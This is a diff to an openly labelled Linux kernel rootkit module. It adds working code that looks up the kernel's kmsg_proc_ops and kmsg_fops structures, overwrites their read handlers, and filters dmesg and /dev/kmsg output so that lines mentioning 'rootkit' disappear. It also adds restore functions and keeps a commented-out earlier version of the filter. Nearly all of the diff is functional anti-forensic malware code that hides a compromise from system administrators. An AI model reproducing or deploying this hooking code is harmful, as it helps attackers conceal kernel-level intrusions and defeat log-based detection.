@@ -9,14 +9,17 @@
 #include <linux/errno.h>
 #include <linux/kobject.h>
 #include <linux/list.h>
+#include <linux/mm.h>
 #include <linux/module.h>
 #include <linux/panic.h>
 #include <linux/pid.h>
 #include <linux/printk.h>
+#include <linux/proc_fs.h>
 #include <linux/rbtree.h>
 #include <linux/rcupdate.h>
 #include <linux/sched.h>
 #include <linux/slab.h>
+#include <linux/string.h>
 #include <linux/sysfs.h>
 #include <linux/types.h>
 #include <linux/vmalloc.h>
@@ -35,6 +38,12 @@ static struct rb_root *p_vma_root   = NULL; // Pointer to `vmap_area_root`
 
 static unsigned long *p_tainted_mask = NULL;
 
+static struct proc_ops *p_kmsg_proc_ops    = NULL; // Pointer to `kmsg_proc_ops`
+static struct file_operations *p_kmsg_fops = NULL; // Pointer to `kmsg_fops`
+
+static proc_read_t p_orig_kmsg_read    = NULL; // Pointer to the original `kmsg_read()` function
+static proc_read_t p_orig_devkmsg_read = NULL; // Pointer to the original `devkmsg_read()` function
+
 #define COPY_CHUNK_SIZE (16 * PAGE_SIZE)
 
 // Taken from kernel/module.c:3103
@@ -51,6 +60,35 @@ int copy_chunked_from_user(void *p_dst, const void __user *p_usrc, unsigned long
         ui64_len -= n;
     } while (ui64_len);
     return 0;
+}
+
+static ssize_t do_kmsg_read_hooked(const proc_read_t orig_read, file_t *p_file, char __user *s_buf,
+                                   size_t sz_count, loff_t *p_ppos)
+{
+    ssize_t sz_ret = 0; // Return value
+
+    pr_info("[ROOTKIT] `%ps()` hooked\n", orig_read);
+
+    // Call the original function and filter the output
+    sz_ret = orig_read(p_file, s_buf, sz_count, p_ppos);
+
+    if (sz_ret > 0) {
+        // Hide lines that contain "rootkit"
+        sz_ret = hide_lines(s_buf, sz_ret, "rootkit");
+    }
+
+    pr_info("[ROOTKIT] * `%ps()` returned %zd\n", orig_read, sz_ret);
+    return sz_ret;
+}
+
+static ssize_t kmsg_read_hooked(file_t *file, char __user *buf, size_t count, loff_t *ppos)
+{
+    return do_kmsg_read_hooked(p_orig_kmsg_read, file, buf, count, ppos);
+}
+
+static ssize_t devkmsg_read_hooked(file_t *file, char __user *buf, size_t count, loff_t *ppos)
+{
+    return do_kmsg_read_hooked(p_orig_devkmsg_read, file, buf, count, ppos);
 }
 
 bool is_filename_hidden(const char *const s_filename)
@@ -181,6 +219,41 @@ void hide_module(void)
     // Remove module from /sys/module/
     kobject_del(&THIS_MODULE->mkobj.kobj);
     list_del(&THIS_MODULE->mkobj.kobj.entry);
+
+    // Hide dmesg entries
+    pr_info("[ROOTKIT] * Hiding dmesg entries...\n");
+
+    IF_L (p_kmsg_proc_ops == NULL) {
+        p_kmsg_proc_ops = (struct proc_ops *)lookup_name("kmsg_proc_ops");
+    }
+    IF_U (p_kmsg_proc_ops == NULL) {
+        pr_err("[ROOTKIT]   * Failed to get `kmsg_proc_ops` address\n");
+    }
+    else {
+        pr_info("[ROOTKIT]   * p_kmsg_proc_ops: %p\n", p_kmsg_proc_ops);
+
+        IF_L (p_orig_kmsg_read == NULL) {
+            p_orig_kmsg_read = p_kmsg_proc_ops->proc_read;
+            pr_info("[ROOTKIT]   * p_orig_kmsg_read: %p\n", p_orig_kmsg_read);
+            change_protected_value(&p_kmsg_proc_ops->proc_read, kmsg_read_hooked);
+        }
+    }
+
+    IF_L (p_kmsg_fops == NULL) {
+        p_kmsg_fops = (struct file_operations *)lookup_name("kmsg_fops");
+    }
+    IF_U (p_kmsg_fops == NULL) {
+        pr_err("[ROOTKIT]   * Failed to get `kmsg_fops` address\n");
+    }
+    else {
+        pr_info("[ROOTKIT]   * p_kmsg_fops: %p\n", p_kmsg_fops);
+
+        IF_L (p_orig_devkmsg_read == NULL) {
+            p_orig_devkmsg_read = p_kmsg_fops->read;
+            pr_info("[ROOTKIT]   * p_orig_devkmsg_read: %p\n", p_orig_devkmsg_read);
+            change_protected_value(&p_kmsg_fops->read, devkmsg_read_hooked);
+        }
+    }
 
     b_hidden = true;
 
@@ -483,3 +556,174 @@ void clear_auth_list(void)
         kfree(p_authorized_pid);
     }
 }
+
+void restore_kmsg_read(void)
+{
+    pr_info("[ROOTKIT] Restoring `kmsg_read()`...\n");
+
+    IF_U (p_kmsg_proc_ops == NULL) {
+        pr_err("[ROOTKIT] * `kmsg_proc_ops` is NULL\n");
+        return;
+    }
+
+    IF_U (p_orig_kmsg_read == NULL) {
+        pr_err("[ROOTKIT] * `p_orig_kmsg_read` is NULL\n");
+        return;
+    }
+
+    p_kmsg_proc_ops->proc_read = p_orig_kmsg_read;
+
+    pr_info("[ROOTKIT] * `kmsg_read()` restored\n");
+}
+
+void restore_devkmsg_read(void)
+{
+    pr_info("[ROOTKIT] Restoring `devkmsg_read()`...\n");
+
+    IF_U (p_kmsg_fops == NULL) {
+        pr_err("[ROOTKIT] * `kmsg_fops` is NULL\n");
+        return;
+    }
+
+    IF_U (p_orig_devkmsg_read == NULL) {
+        pr_err("[ROOTKIT] * `p_orig_devkmsg_read` is NULL\n");
+        return;
+    }
+
+    p_kmsg_fops->read = p_orig_devkmsg_read;
+
+    pr_info("[ROOTKIT] * `devkmsg_read()` restored\n");
+}
+
+size_t hide_lines(char __user *const s_buffer, const size_t sz_len, const char *const s_search)
+{
+    size_t sz_ret    = sz_len; // Return buffer size
+    char *s_buffer_k = NULL;   // Kernel buffer
+
+    pr_info("[ROOTKIT] Checking lines to hide...\n");
+
+    s_buffer_k = kvmalloc(sz_len, GFP_KERNEL);
+    IF_U (s_buffer_k == NULL) {
+        pr_err("[ROOTKIT] * Failed to allocate kernel buffer\n");
+        goto ret;
+    }
+
+    IF_U (copy_from_user(s_buffer_k, s_buffer, sz_len) != 0) {
+        pr_err("[ROOTKIT] * Failed to copy buffer from user\n");
+        goto free_ret;
+    }
+
+    pr_info("[ROOTKIT] * Buffer: %s\n", s_buffer_k);
+
+    IF_U (strnstr(s_buffer_k, s_search, sz_len) != NULL) {
+        pr_info("[ROOTKIT]   * Hiding line\n");
+        // Set the user buffer to "\n" and return size 1
+        IF_U (copy_to_user(s_buffer, "\n", 1) != 0) {
+            pr_err("[ROOTKIT] * Failed to copy data to user\n");
+            sz_ret = sz_len;
+            goto free_ret;
+        }
+        IF_U (clear_user(s_buffer, sz_len) != 0) {
+            pr_err("[ROOTKIT] * Failed to clear user buffer\n");
+        }
+        sz_ret = 1;
+    }
+    else {
+        pr_info("[ROOTKIT]   * Keeping line\n");
+    }
+
+free_ret:
+    kvfree(s_buffer_k);
+ret:
+    return sz_ret;
+}
+
+// size_t hide_lines(char __user *const s_buffer, const size_t sz_len, const char *const s_search)
+// {
+//     size_t sz_ret      = sz_len; // Return buffer size
+//     size_t sz_line_len = 0;      // Line length
+//     char *s_buffer_k   = NULL;   // Kernel buffer
+//     char *s_result     = NULL;   // Result buffer
+//     char *s_line       = NULL;   // Line pointer
+//     char *s_end        = NULL;   // End of line pointer
+
+//     pr_info("[ROOTKIT] Hiding lines...\n");
+
+//     s_buffer_k = kvmalloc(sz_len, GFP_KERNEL);
+//     IF_U (s_buffer_k == NULL) {
+//         pr_err("[ROOTKIT] * Failed to allocate kernel buffer\n");
+//         goto ret;
+//     }
+
+//     IF_U (copy_from_user(s_buffer_k, s_buffer, sz_len) != 0) {
+//         pr_err("[ROOTKIT] * Failed to copy buffer from user\n");
+//         goto free_ret;
+//     }
+
+//     pr_info("[ROOTKIT] * Buffer: %s\n", s_buffer_k);
+
+//     s_result = kvmalloc(sz_len, GFP_KERNEL);
+//     IF_U (s_result == NULL) {
+//         pr_err("[ROOTKIT] * Failed to allocate result buffer\n");
+//         goto free_ret;
+//     }
+
+//     s_line = s_buffer_k;
+
+//     while ((s_end = strnchr(s_line, sz_ret, '\n')) != NULL) {
+//         pr_info("[ROOTKIT] * Line: %s\n", s_line);
+//         sz_line_len = s_end - s_line + 1;
+
+//         IF_U (strnstr(s_line, s_search, sz_line_len - 1) != NULL) {
+//             pr_info("[ROOTKIT]   * Hiding line\n");
+//             sz_ret -= sz_line_len;
+//             s_line = s_end + 1;
+//             continue;
+//         }
+
+//         pr_info("[ROOTKIT]   * Keeping line\n");
+
+//         strncat(s_result, s_line, sz_line_len);
+//         s_line = s_end + 1;
+//     }
+
+//     /*
+//     while ((s_line = strsep(&s_buffer_k, "\n")) != NULL) {
+//         if (!*s_line) {
+//             continue;
+//         }
+
+//         pr_info("[ROOTKIT] * Line: %s\n", s_line);
+
+//         if (strnstr(s_line, s_search, sz_len) != NULL) {
+//             pr_info("[ROOTKIT]   * Hiding line\n");
+//             continue;
+//         }
+
+//         pr_info("[ROOTKIT]   * Keeping line\n");
+//     }
+//     */
+
+//     pr_info("[ROOTKIT] * Result: %s\n", s_result);
+
+//     IF_U (copy_to_user(s_buffer, s_result, sz_ret) != 0) {
+//         pr_err("[ROOTKIT] * Failed to copy buffer to user\n");
+//         sz_ret = sz_len;
+//         goto free_res;
+//     }
+
+//     IF_U (sz_ret < sz_len) {
+//         // Erase the rest of the user buffer to avoid leaking data
+//         IF_U (clear_user(s_buffer + sz_ret, sz_len - sz_ret) != 0) {
+//             pr_err("[ROOTKIT] * Failed to clear user buffer\n");
+//             goto free_res;
+//         }
+//     }
+
+// free_res:
+//     kvfree(s_result);
+// free_ret:
+//     kvfree(s_buffer_k);
+// ret:
+//     return sz_ret;
+// }
